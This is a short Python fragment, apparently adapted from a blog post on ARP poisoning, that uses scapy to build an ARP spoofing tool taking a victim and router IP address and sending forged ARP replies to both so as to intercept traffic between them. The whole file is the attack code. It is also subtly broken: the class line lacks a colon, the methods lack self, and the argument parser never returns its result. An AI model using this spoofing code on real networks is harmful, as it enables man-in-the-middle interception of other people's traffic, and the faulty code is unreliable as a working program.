#REF: danmcinerney.org/arp-poisoning-with-python2/

from scapy.all import *
import argparse
import signal
import sys
import logging
import time

class Poison
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    def parse_args():
        parser = argparse.ArgumentParser();
        parser.add_argument("-v", "--victimIP", help="Choose the victim IP address. Example: -v 192.168.0.5")
        parser.add_argument("-r", "--routerIP", help="Choose the router IP address. Example: -r 192.168.0.1")

    def poison(routerIP, victimIP, routerMAC, victimMAC):
        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))
